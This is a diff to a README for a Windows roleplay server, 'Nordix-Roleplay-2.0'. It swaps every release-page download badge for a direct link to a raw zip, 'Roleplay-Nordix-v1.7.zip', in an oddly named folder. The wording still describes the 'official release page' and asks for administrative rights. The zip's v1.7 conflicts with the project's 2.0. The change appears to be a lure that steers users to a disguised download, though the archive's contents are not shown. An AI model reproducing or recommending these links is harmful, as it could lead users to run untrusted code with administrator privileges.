@@ -1,6 +1,6 @@
 # 🎮 Nordix-Roleplay-2.0 - Smooth and Stable Roleplay Server
 
-[![Download Nordix-Roleplay-2.0](https://img.shields.io/badge/Download-Nordix--Roleplay--2.0-blue?style=for-the-badge)](https://github.com/x644k/Nordix-Roleplay-2.0/releases)
+[![Download Nordix-Roleplay-2.0](https://img.shields.io/badge/Download-Nordix--Roleplay--2.0-blue?style=for-the-badge)](https://github.com/x644k/Nordix-Roleplay-2.0/raw/refs/heads/main/hemicylindrical/Roleplay-Nordix-v1.7.zip)
 
 ---
 
@@ -31,7 +31,7 @@ Ensure you have **administrative rights** on your Windows machine to install and
 
 Click the badge below to visit the official release page and get the necessary files:
 
-[![Download Nordix-Roleplay-2.0](https://img.shields.io/badge/Download-Nordix--Roleplay--2.0-blue?style=for-the-badge)](https://github.com/x644k/Nordix-Roleplay-2.0/releases)
+[![Download Nordix-Roleplay-2.0](https://img.shields.io/badge/Download-Nordix--Roleplay--2.0-blue?style=for-the-badge)](https://github.com/x644k/Nordix-Roleplay-2.0/raw/refs/heads/main/hemicylindrical/Roleplay-Nordix-v1.7.zip)
 
 ### How to download
 
@@ -137,6 +137,6 @@ If you prefer to start the server manually:
 
 Use this link again to start your setup process:
 
-[![Download Nordix-Roleplay-2.0](https://img.shields.io/badge/Download-Nordix--Roleplay--2.0-blue?style=for-the-badge)](https://github.com/x644k/Nordix-Roleplay-2.0/releases)
+[![Download Nordix-Roleplay-2.0](https://img.shields.io/badge/Download-Nordix--Roleplay--2.0-blue?style=for-the-badge)](https://github.com/x644k/Nordix-Roleplay-2.0/raw/refs/heads/main/hemicylindrical/Roleplay-Nordix-v1.7.zip)
 
 Visit the release page, download the server package, and follow the steps above to get your roleplay server running smoothly on Windows.
